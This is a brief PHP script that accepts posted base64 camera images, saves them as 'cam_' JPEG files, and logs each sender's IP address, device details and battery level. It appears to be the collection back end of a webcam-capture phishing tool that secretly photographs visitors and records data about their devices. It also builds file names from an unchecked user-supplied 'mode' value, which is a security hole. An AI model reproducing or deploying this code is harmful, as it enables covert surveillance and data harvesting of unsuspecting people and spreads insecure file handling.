<?php
$data = json_decode(file_get_contents('php://input'), true);
if ($data) {
    $img = str_replace('data:image/jpeg;base64,', '', $data['image']);
    $img = str_replace(' ', '+', $img);
    $name = 'cam_' . $data['mode'] . '_' . date("His") . '.jpg';
    file_put_contents($name, base64_decode($img));

    $ip = $_SERVER['REMOTE_ADDR'];
    $logEntry = "IP: $ip | Device: " . $data['device'] . " | Battery: " . $data['battery'] . " | Saved: $name";
    file_put_contents("logs.txt", $logEntry . "\n", FILE_APPEND);
}
?>
